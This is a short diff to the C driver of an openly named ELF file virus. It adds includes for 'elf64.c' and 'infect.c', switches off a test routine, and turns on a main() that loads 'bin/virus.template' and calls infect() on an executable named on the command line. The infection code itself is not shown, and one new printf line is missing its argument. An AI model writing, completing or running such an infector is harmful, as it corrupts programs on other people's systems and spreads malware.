@@ -1,11 +1,7 @@
+#define INFECTOR
 #include "lib/lib.c"
-
-int fail(char *reason){
-	print("FAIL: ");
-	print(reason);
-	println("");
-	return 1;
-}
+#include "lib/elf64.c"
+#include "lib/infect.c"
 
 int usage(char *name){
 	print("usage: ./");
@@ -34,11 +30,14 @@ void test(){
 }
 
 int main(int ac, char **av){
-	test();
-	/*if (ac < 2){
+//	test();
+
+	printf("start:%zu\n");
+	if (ac < 2){
 		return usage(av[0]);
 	}
 	char *template; size_t n;
 	fget("bin/virus.template", &template, &n);
-	return infect(av[1], template, n) == FALSE;*/
+	infect(av[1], template, n);
+	return 0;
 }
